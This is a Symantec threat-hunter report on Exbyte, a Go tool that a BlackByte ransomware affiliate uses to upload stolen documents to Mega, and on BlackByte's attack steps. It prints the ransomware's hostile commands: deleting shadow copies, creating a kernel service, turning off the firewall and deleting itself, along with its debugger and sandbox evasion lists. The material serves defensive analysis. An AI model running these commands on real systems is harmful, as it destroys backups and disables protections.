Exbyte: BlackByte Ransomware Attackers Deploy New Exfiltration Tool

Threat Hunter TeamSymantec
Symantec’s Threat Hunter Team has discovered that at least one affiliate of the BlackByte ransomware (Ransom.Blackbyte) operation has
begun using a custom data exfiltration tool during their attacks. The malware (Infostealer.Exbyte) is designed to expedite the theft of data from
the victim’s network and upload it to an external server.
BlackByte is a ransomware-as-a-service operation that is run by a cyber-crime group Symantec calls Hecamede. The group sprang to public
attention in February 2022 when the U.S. Federal Bureau of Investigation (FBI) issued an alert stating that BlackByte had been used to attack
multiple entities in the U.S., including organizations in at least three critical infrastructure sectors. In recent months, BlackByte has become one
of the most frequently used payloads in ransomware attacks.

Inside Exbyte
The Exbyte exfiltration tool is written in Go and designed to upload stolen files to the Mega.co.nz cloud storage service.
On execution, Exbyte performs a series of checks for indicators that it may be running in a sandboxed environment. This is intended to make it
more difficult for security researchers to analyze the malware. To do this, it calls the IsDebuggerPresent and CheckRemoteDebuggerPresent
APIs. It then checks for the running processes from the following applications:
MegaDumper 1.0 by CodeCracker / SnD
Import reconstructor
x64dbg
x32dbg
OLLYDBG
WinDbg
The Interactive Disassembler
Immunity Debugger - [CPU]
It then checks for the following anti-virus or sandbox-related files:

1/5

avghooka.dll
avghookx.dll
sxin.dll
sf2.dll
sbiedll.dll
snxhk.dll
cmdvrt32.dll
cmdvrt64.dll
wpespy.dll
vmcheck.dll
pstorec.dll
dir_watch.dll
api_log.dll
dbghelp.dll
This routine of checks is quite similar to the routine employed by the BlackByte payload itself, as documented recently by Sophos.
Next, Exbyte enumerates all document files on the infected computer, such as .txt, .doc, and .pdf files, and saves the full path and file name to
%APPDATA%\dummy. The files listed are then uploaded to a folder the malware creates on Mega.co.nz. Credentials for the Mega account
used are hardcoded into Exbyte.
Exbyte is not the first custom-developed data exfiltration tool to be linked to a ransomware operation. In November 2021, Symantec discovered
Exmatter, an exfiltration tool that was used by the BlackMatter ransomware operation and has since been used in Noberus attacks. Other
examples include the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware.

BlackByte TTPs
In recent BlackByte attacks investigated by Symantec, the attackers exploited the ProxyShell (CVE-2021-34473, CVE-2021-34523, and CVE2021-31207) and ProxyLogon (CVE-2021-26855 and CVE-2021-27065) vulnerabilities in Microsoft Exchange Servers to gain initial access.
Symantec has observed attackers using AdFind, AnyDesk, NetScan, and PowerView prior to deploying the ransomware payload.
Recent attacks have used version 2.0 of the BlackByte payload. On execution, the ransomware payload itself appears to download and save
debugging symbols from Microsoft. The command is executed directly from the ransomware:
powershell -command "(New-Object
Net.WebClient).DownloadFile('http://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp.pdb
'CSIDL_SYSTEM_DRIVE\systemdata\ntkrnlmp.pdb')"
The ransomware then checks the version information of ntoskrnl.exe and then creates a service with the following details:
binPath = C:\systemdata\generalate
displayName = AAAAAAAAAAAAAA!!!!!!!!!!!!!!!
BlackByte then proceeds with the removal of Kernel Notify Routines. The purpose of this is to attempt to bypass EDR products. This
functionality in BlackByte has already been documented by Sophos and it closely resembles the techniques leveraged in the EDRSandblast
tool.
BlackByte uses VssAdmin to delete volume shadow copies and resize storage allocation:
cmd.exe /c start vssadmin.exe Delete Shadows /All /Quiet
vssadmin Resize ShadowStorage /For=K: /On=K: /MaxSize=401MB
It then makes the following service modifications:
sc create ODosTEmONa binPath= CSIDL_SYSTEM_DRIVE\systemdata\generalate type= kernel
sc.exe config RemoteRegistry start= auto
sc.exe config Dnscache start= auto
sc.exe config SSDPSRV start= auto
sc.exe config fdPHost start= auto
sc.exe config upnphost start= auto

2/5

The ransomware then modifies firewall settings to enable linked connections:
netsh advfirewall firewall set rule "group=\"Network Discovery\" " new enable=Yes"
netsh advfirewall firewall set rule "group=\"File and Printer Sharing\" " new enable=Yes"
cmd.exe /c netsh advfirewall set allprofiles state off
Finally, BlackByte injects itself into an instance of svchost.exe, conducts file encryption, and then deletes the ransomware binary on disk:
cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del CSIDL_WINDOWS\rdac.exe /F /Q
CSIDL_SYSTEM\svchost.exe -s 27262842

Emerging Force
Following the departure of a number of major ransomware operations such as Conti and Sodinokibi, BlackByte has emerged as one of the
ransomware actors to profit from this gap in the market. The fact that actors are now creating custom tools for use in BlackByte attacks
suggests that it may be on the way to becoming one of the dominant ransomware threats.
